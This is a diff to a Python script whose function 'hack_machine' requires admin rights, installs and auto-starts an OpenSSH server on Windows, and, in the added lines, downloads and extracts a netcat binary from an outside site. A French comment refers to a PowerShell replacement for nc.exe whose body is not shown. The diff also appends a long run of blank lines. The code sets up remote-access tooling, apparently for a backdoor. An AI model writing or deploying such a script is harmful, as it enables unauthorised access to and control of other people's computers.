@@ -10,6 +10,20 @@ def is_admin():
     except AttributeError:
         return False
 
+def install_ncat():
+    ncat_url = "https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip"
+    ncat_zip = "netcat-win32-1.12.zip"
+    ncat_exe = "nc.exe"
+
+    if not os.path.exists(ncat_exe):
+        import urllib.request
+        urllib.request.urlretrieve(ncat_url, ncat_zip)
+
+        import zipfile
+        with zipfile.ZipFile(ncat_zip, 'r') as zip_ref:
+            zip_ref.extractall()
+        os.remove(ncat_zip)
+
 def hack_machine():
     if not is_admin():
         print("This script must be run as an administrator.")
@@ -20,6 +34,8 @@ def hack_machine():
     subprocess.call(['powershell', 'Install-WindowsFeature', '-name', 'OpenSSH-Server'])
     subprocess.call(['powershell', 'Start-Service', 'sshd'])
     subprocess.call(['powershell', 'Set-Service', '-Name', 'sshd', '-StartupType', 'Automatic'])
+
+    install_ncat()
 
     # Remplacement de la commande nc.exe par la commande PowerShell
     powershell_command = '''
@@ -58,3 +74,33 @@ if __name__ == "__main__":
     if platform.system() != "Windows":
         sys.exit(1)
     hack_machine()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
